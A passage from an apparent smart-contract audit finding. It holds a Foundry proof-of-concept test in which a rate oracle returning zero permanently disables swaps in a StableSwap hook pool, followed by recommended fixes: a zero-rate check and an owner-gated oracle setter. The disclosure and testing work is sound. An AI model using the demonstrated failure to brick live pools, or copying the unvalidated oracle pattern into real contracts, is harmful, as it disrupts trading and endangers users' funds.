    ///   T=3  Every swap from this point forward reverts - the AMM is dead.
    ///        No admin can fix it on-chain.
    ///   T=4  The LP can still withdraw capital proportionally.
    ///        But: all accrued swap fees since T=2 are trapped in hookFees[]
    ///        and protocolFees[] and CAN still be withdrawn via their dedicated
    ///        withdrawal functions (those also don't call _getRate).
    function test_fullImpactScenario() public {
        // T=0 / T=1 already done in setUp - poolA is seeded.

        uint256 lpShares    = poolA.balanceOf(liquidityProvider);
        uint256 totalSupply = poolA.totalSupply();

        console2.log("=== Full impact scenario ===");
        console2.log("[T=1] LP shares held         :", lpShares);
        console2.log("[T=1] Pool total supply       :", totalSupply);

        // T=2: Perform a few swaps to accumulate fees, then break the oracle.
        _exactInputSwap(poolA, true,  _wei(currency0, SWAP_AMOUNT));
        _exactInputSwap(poolA, false, _wei(currency1, SWAP_AMOUNT));

        uint256 protocolFeesAccrued = poolA.protocolFees(1);
        uint256 hookFeesAccrued     = poolA.hookFees(1);

        console2.log("[T=2] protocolFees[1] accrued:", protocolFeesAccrued);
        console2.log("[T=2] hookFees[1] accrued    :", hookFeesAccrued);

        // Oracle goes dark.
        liveOracle.breakOracle();
        console2.log("[T=3] Oracle broke - liveOracle.getRate() =", liveOracle.getRate());

        // T=3: No swap can execute.
        uint256 swapAmt = _wei(currency0, SWAP_AMOUNT);
        vm.expectRevert();
        this._exactInputSwapExternal(poolA, true, swapAmt);
        console2.log("[T=3] Swap attempt: REVERTED (pool permanently bricked for trading)");

        // T=4: LP exits successfully.
        uint256 c0Before = IERC20(Currency.unwrap(currency0)).balanceOf(liquidityProvider);
        uint256 c1Before = IERC20(Currency.unwrap(currency1)).balanceOf(liquidityProvider);

        uint256[] memory minAmounts = new uint256[](2);
        vm.prank(liquidityProvider);
        poolA.removeLiquidity(lpShares, minAmounts);

        console2.log("[T=4] removeLiquidity: SUCCESS");
        console2.log("[T=4] currency0 withdrawn:", IERC20(Currency.unwrap(currency0)).balanceOf(liquidityProvider) - c0Before);
        console2.log("[T=4] currency1 withdrawn:", IERC20(Currency.unwrap(currency1)).balanceOf(liquidityProvider) - c1Before);

        // Assertions
        assertEq(
            poolA.balanceOf(liquidityProvider),
            0,
            "All LP shares burned on exit"
        );
        assertGt(
            IERC20(Currency.unwrap(currency0)).balanceOf(liquidityProvider),
            c0Before,
            "LP recovers currency0"
        );
        assertGt(
            IERC20(Currency.unwrap(currency1)).balanceOf(liquidityProvider),
            c1Before,
            "LP recovers currency1"
        );

        console2.log("=== Impact Summary ===");
        console2.log("Swaps:           PERMANENTLY DISABLED (no recovery)");
        console2.log("addLiquidity:    Initial deposit DISABLED; subsequent proportional deposit OK");
        console2.log("removeLiquidity: WORKS (funds recoverable)");
        console2.log("Net severity:    HIGH - pool permanently bricked as an AMM");
        console2.log("                 funds are not permanently locked");
    }

    // ════════════════════════════════════════════════════════════════════════
    // Internal helpers
    // ════════════════════════════════════════════════════════════════════════

    function _noOracle() private pure returns (Base.RateOracleConfig memory) {
        return Base.RateOracleConfig({oracle: address(0), selector: bytes4(0)});
    }

    function _externalOracle(address _oracle) private pure returns (Base.RateOracleConfig memory) {
        return Base.RateOracleConfig({oracle: _oracle, selector: bytes4(keccak256("getRate()"))});
    }

    /// @dev Deploy a 2-currency hook using currency0/currency1 from ExternalContractsDeployer.
    function _deployPool(
        Base.RateOracleConfig memory _oracle0,
        Base.RateOracleConfig memory _oracle1
    ) private returns (StableSwapHooks h) {
        Currency[] memory currencies_ = new Currency[](2);
        currencies_[0] = currency0;
        currencies_[1] = currency1;

        Base.RateOracleConfig[] memory oracles = new Base.RateOracleConfig[](2);
        oracles[0] = _oracle0;
        oracles[1] = _oracle1;

        bytes memory code = type(StableSwapHooks).creationCode;
        (, bytes32 salt) = factory.mineSalt(currencies_, oracles, BASE_LP_FEE_PERCENTAGE, BASE_AMP, code);

        h = StableSwapHooks(
            factory.deploy(currencies_, oracles, BASE_LP_FEE_PERCENTAGE, BASE_AMP, salt, code)
        );

        vm.startPrank(defaultAdmin);
        h.setProtocolFeePercentage(BASE_PROTOCOL_FEE_PERCENTAGE);
        h.setHookFeePercentage(BASE_HOOK_FEE_PERCENTAGE);
        vm.stopPrank();
    }

    /// @dev Fund liquidityProvider and swapper, approve both to spend from the given hook.
    function _fundAndApprove(address _hook) private {
        deal(Currency.unwrap(currency0), liquidityProvider, _wei(currency0, 4_000_000));
        deal(Currency.unwrap(currency1), liquidityProvider, _wei(currency1, 4_000_000));
        deal(Currency.unwrap(currency0), swapper,           _wei(currency0, 2_000_000));
        deal(Currency.unwrap(currency1), swapper,           _wei(currency1, 2_000_000));

        vm.startPrank(liquidityProvider);
        IERC20(Currency.unwrap(currency0)).forceApprove(_hook, type(uint256).max);
        IERC20(Currency.unwrap(currency1)).forceApprove(_hook, type(uint256).max);
        vm.stopPrank();

        vm.startPrank(swapper);
        IERC20(Currency.unwrap(currency0)).forceApprove(address(permit2), type(uint256).max);
        IERC20(Currency.unwrap(currency1)).forceApprove(address(permit2), type(uint256).max);
        permit2.approve(Currency.unwrap(currency0), address(universalRouter), type(uint160).max, type(uint48).max);
        permit2.approve(Currency.unwrap(currency1), address(universalRouter), type(uint160).max, type(uint48).max);
        vm.stopPrank();
    }

    /// @dev Add proportional liquidity to the given hook.
    function _addLiquidity(StableSwapHooks _hook, uint256 _amount0, uint256 _amount1) private {
        uint256[] memory amounts    = new uint256[](2);
        uint256[] memory minAmounts = new uint256[](2);
        amounts[0] = _wei(currency0, _amount0);
        amounts[1] = _wei(currency1, _amount1);

        vm.prank(liquidityProvider);
        _hook.addLiquidity(amounts, minAmounts, 0);
    }

    /// @dev Convert human-readable token units to token-decimal wei.
    function _wei(Currency _c, uint256 _amount) private view returns (uint256) {
        return _amount * 10 ** IERC20Metadata(Currency.unwrap(_c)).decimals();
    }

    /// @dev Build a PoolKey for the given hook over currency0/currency1.
    function _poolKey(StableSwapHooks _hook) private view returns (PoolKey memory) {
        return PoolKey({
            currency0:   currency0,
            currency1:   currency1,
            fee:         uint24(BASE_LP_FEE_PERCENTAGE),
            tickSpacing: _hook.TICK_SPACING(),
            hooks:       IHooks(address(_hook))
        });
    }

    /// @dev Execute an exact-input swap through the UniversalRouter.
    function _exactInputSwap(StableSwapHooks _hook, bool _zeroForOne, uint256 _amountIn) private {
        PoolKey  memory pk            = _poolKey(_hook);
        Currency inputCurrency        = _zeroForOne ? pk.currency0 : pk.currency1;
        Currency outputCurrency       = _zeroForOne ? pk.currency1 : pk.currency0;

        bytes memory actions = abi.encodePacked(
            uint8(Actions.SWAP_EXACT_IN_SINGLE),
            uint8(Actions.SETTLE_ALL),
            uint8(Actions.TAKE_ALL)
        );
        bytes[] memory params = new bytes[](3);
        params[0] = abi.encode(
            IV4Router.ExactInputSingleParams({
                poolKey:          pk,
                zeroForOne:       _zeroForOne,
                amountIn:         uint128(_amountIn),
                amountOutMinimum: 0,
                hookData:         bytes("")
            })
        );
        params[1] = abi.encode(inputCurrency,  _amountIn);
        params[2] = abi.encode(outputCurrency, 0);

        bytes memory commands = abi.encodePacked(uint8(Commands.V4_SWAP));
        bytes[] memory inputs = new bytes[](1);
        inputs[0] = abi.encode(actions, params);

        vm.prank(swapper);
        universalRouter.execute(commands, inputs, block.timestamp + 100);
    }

    /// @dev Execute an exact-output swap through the UniversalRouter.
    function _exactOutputSwap(StableSwapHooks _hook, bool _zeroForOne, uint256 _amountOut) private {
        PoolKey  memory pk      = _poolKey(_hook);
        Currency inputCurrency  = _zeroForOne ? pk.currency0 : pk.currency1;
        Currency outputCurrency = _zeroForOne ? pk.currency1 : pk.currency0;

        bytes memory actions = abi.encodePacked(
            uint8(Actions.SWAP_EXACT_OUT_SINGLE),
            uint8(Actions.SETTLE_ALL),
            uint8(Actions.TAKE_ALL)
        );
        bytes[] memory params = new bytes[](3);
        params[0] = abi.encode(
            IV4Router.ExactOutputSingleParams({
                poolKey:         pk,
                zeroForOne:      _zeroForOne,
                amountOut:       uint128(_amountOut),
                amountInMaximum: type(uint128).max,
                hookData:        bytes("")
            })
        );
        params[1] = abi.encode(inputCurrency,  type(uint128).max);
        params[2] = abi.encode(outputCurrency, _amountOut);

        bytes memory commands = abi.encodePacked(uint8(Commands.V4_SWAP));
        bytes[] memory inputs = new bytes[](1);
        inputs[0] = abi.encode(actions, params);

        vm.prank(swapper);
        universalRouter.execute(commands, inputs, block.timestamp + 100);
    }

    // ── External wrappers (required for vm.expectRevert on internal calls) ──

    /// @dev Exposed so vm.expectRevert can catch panics that bubble up through
    ///      the UniversalRouter -> PoolManager -> hook call chain.
    function _exactInputSwapExternal(StableSwapHooks _hook, bool _zeroForOne, uint256 _amountIn) external {
        _exactInputSwap(_hook, _zeroForOne, _amountIn);
    }

    function _exactOutputSwapExternal(StableSwapHooks _hook, bool _zeroForOne, uint256 _amountOut) external {
        _exactOutputSwap(_hook, _zeroForOne, _amountOut);
    }
}
```

## Recommendation
Two independent fixes are needed, both should be applied together:
1. Validate the fetched rate before use. Add an explicit zero check immediately after decoding the oracle return value in `Base.sol`:
```solidity
// Base.sol — _getRate()
uint256 fetchedRate = abi.decode(returnData, (uint256));
if (fetchedRate == 0) revert InvalidOracleRate(); // add this

rate = rate * fetchedRate / StableSwapMath.RATE_PRECISION;
```
This converts the silent panic into an explicit, descriptive revert, making oracle failures debuggable and preventing state corruption from a zero-scaled reserve being used in arithmetic.
2. Add an oracle update mechanism. Introduce a onlyFactoryOwner-gated setter so a broken oracle address can be replaced without redeploying the entire pool:
```solidity
// Base.sol
error InvalidOracleRate();

function setRateOracle(uint256 _index, address _oracle, bytes4 _selector)
    external
    onlyFactoryOwner
{
    if (_index >= currenciesLength) revert InvalidCurrenciesLength();
    rateOracles[_index] = RateOracleConfig({oracle: _oracle, selector: _selector});
}
```
Together these fixes mean: a zero-returning oracle causes a clean, recoverable revert rather than a permanent panic, and the factory owner can point the pool at a working oracle without requiring LP migration. An additional hardening measure worth considering is a sanity bound on `fetchedRate` (e.g. requiring it to be within an expected range relative to `RATE_PRECISION`) to guard against oracle manipulation producing extreme but non-zero rates.